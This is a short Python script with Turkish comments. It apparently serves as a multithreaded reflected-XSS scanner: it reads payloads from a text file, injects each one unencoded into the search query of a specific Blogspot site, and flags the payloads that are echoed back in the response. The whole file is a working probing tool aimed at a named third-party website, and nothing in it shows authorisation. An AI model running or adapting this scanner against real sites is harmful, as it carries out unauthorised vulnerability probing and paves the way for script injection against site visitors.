import requests
import threading
import queue

# URL şablonu; {} yerine payload yerleştirilecek
url_template = "https://icimdekikaos.blogspot.com/search?q={}"

# Thread-safe bir kuyruk oluşturuyoruz
payload_queue = queue.Queue()

# TXT dosyasındaki payload'ları kuyruğa ekle
with open("xss-payload-list.txt", "r", encoding="utf-8") as file:
    for line in file:
        payload = line.strip()
        if payload:  # boş satırları atla
            payload_queue.put(payload)

def worker():
    while not payload_queue.empty():
        payload = payload_queue.get()
        # URL şablonundaki {} yerine payload'u yerleştiriyoruz
        url = url_template.format(payload)
        try:
            response = requests.get(url, timeout=5)
            # Eğer payload yanıt içerisinde görünüyorsa potansiyel XSS açığı olabilir
            if payload in response.text:
                print(f"[+] Potansiyel XSS açığı: '{payload}' yansıtılmış.")
            else:
                #print(f"[-] '{payload}' yansıtılmamış.")
                print()
        except Exception as e:
            print(f"[!] '{payload}' gönderilirken hata: {e}")
        finally:
            payload_queue.task_done()

# Kullanmak istediğimiz thread sayısı
num_threads = 10
threads = []

for i in range(num_threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Kuyruğun tamamen boşalmasını bekliyoruz
payload_queue.join()

# Tüm thread'lerin tamamlandığından emin oluyoruz
for t in threads:
    t.join()

print("Tüm payload'lar test edildi.")
